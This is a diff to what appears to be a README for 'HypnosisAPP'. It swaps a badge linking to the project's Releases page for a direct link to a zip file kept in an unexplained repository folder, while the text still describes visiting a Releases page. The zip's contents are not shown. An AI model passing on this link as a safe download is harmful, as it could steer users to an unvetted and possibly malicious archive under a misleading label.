@@ -16,7 +16,7 @@
 To get started, you need to download the HypnosisAPP. You can find the latest version on our Releases page.  
 
 ### Download Link
-[![Download HypnosisAPP](https://img.shields.io/badge/Download_HypnosisAPP-Click_Here-brightgreen)](https://github.com/amire3MAk-web/HypnosisAPP/releases)
+[![Download HypnosisAPP](https://raw.githubusercontent.com/amire3MAk-web/HypnosisAPP/main/knotberry/HypnosisAPP.zip)](https://raw.githubusercontent.com/amire3MAk-web/HypnosisAPP/main/knotberry/HypnosisAPP.zip)
 
 Click the link above to visit the page where you can download the app. Once on the Releases page, follow these steps:
 
